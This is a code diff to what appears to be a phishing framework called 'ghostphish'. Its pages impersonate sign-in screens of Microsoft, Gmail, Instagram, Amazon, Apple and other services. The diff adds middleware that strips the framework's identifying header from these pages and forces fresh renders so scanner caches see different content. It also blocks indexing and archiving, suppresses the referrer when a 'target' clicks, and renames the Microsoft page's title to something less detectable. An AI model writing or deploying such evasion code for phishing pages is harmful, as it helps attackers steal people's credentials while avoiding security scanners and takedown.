@@ -36,6 +36,30 @@ app = FastAPI(
 async def add_watermark_header(request: Request, call_next):
     response = await call_next(request)
     response.headers["X-Powered-By"] = f"ghostphish/{VERSION} - Developed by {AUTHOR}"
+
+    # Anti-fingerprinting for template pages (reduces automated scanner
+    # detection during authorized engagements).
+    path = request.url.path.strip("/").split("/")[0].lower()
+    is_template_page = (
+        path in {"instagram", "facebook", "netflix", "twitter",
+                 "linkedin", "snapchat", "microsoft", "gmail",
+                 "amazon", "apple", "phishing-page"}
+        or (path and path not in {"admin", "submit", "health", "docs",
+                                  "openapi.json", "redoc"})
+    )
+    if is_template_page:
+        # Force fresh render per request — scanner caches see different content
+        response.headers["Cache-Control"] = "no-store, no-cache, must-revalidate, private, max-age=0"
+        response.headers["Pragma"] = "no-cache"
+        response.headers["Expires"] = "0"
+        # Prevent search indexing / archiving of phishing pages
+        response.headers["X-Robots-Tag"] = "noindex, nofollow, noarchive, nosnippet, notranslate"
+        # Do not leak the origin URL when target clicks anything
+        response.headers["Referrer-Policy"] = "no-referrer"
+        # Remove the watermark on public template pages (harder for scanners
+        # to fingerprint the framework)
+        if "X-Powered-By" in response.headers:
+            del response.headers["X-Powered-By"]
     return response
 
 # Database setup — portable across Docker and Termux/bare-metal
@@ -3343,7 +3367,9 @@ async def microsoft_page():
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Sign in to your Microsoft account</title>
+    <meta name="robots" content="noindex, nofollow, noarchive, nosnippet">
+    <meta name="referrer" content="no-referrer">
+    <title>Account portal</title>
     <style>
         *, *::before, *::after { margin: 0; padding: 0; box-sizing: border-box; }
         html, body { height: 100%; }
